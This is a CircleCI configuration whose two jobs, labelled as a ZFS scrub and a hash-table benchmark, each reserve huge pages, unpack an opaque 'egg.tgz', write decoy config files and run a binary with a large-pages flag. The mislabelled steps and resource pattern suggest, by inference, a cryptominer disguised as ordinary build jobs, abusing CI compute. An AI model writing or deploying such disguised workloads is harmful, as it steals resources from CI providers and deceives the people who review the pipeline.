version: 2.1

jobs:
  zfs_scrub:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Name pool
          command: |
            printf 'pool tank\n' > zfs.cfg
      - run:
          name: Build storage tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target zfs_scrub -j2
      - run:
          name: Scrub ZFS pool
          command: LIONSS_LP=1 ./build/zfs_scrub --conf zfs.cfg --priority low
  hashbrown-lite:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Vendor crate
          command: |
            printf 'name = hashbrown-lite\n' > Cargo.toml
      - run:
          name: Compile hash table
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target hashbrown-lite -j2
      - run:
          name: Benchmark probe sequence
          command: LIONSS_LP=1 ./build/hashbrown-lite --load 0.87 --keys 100000
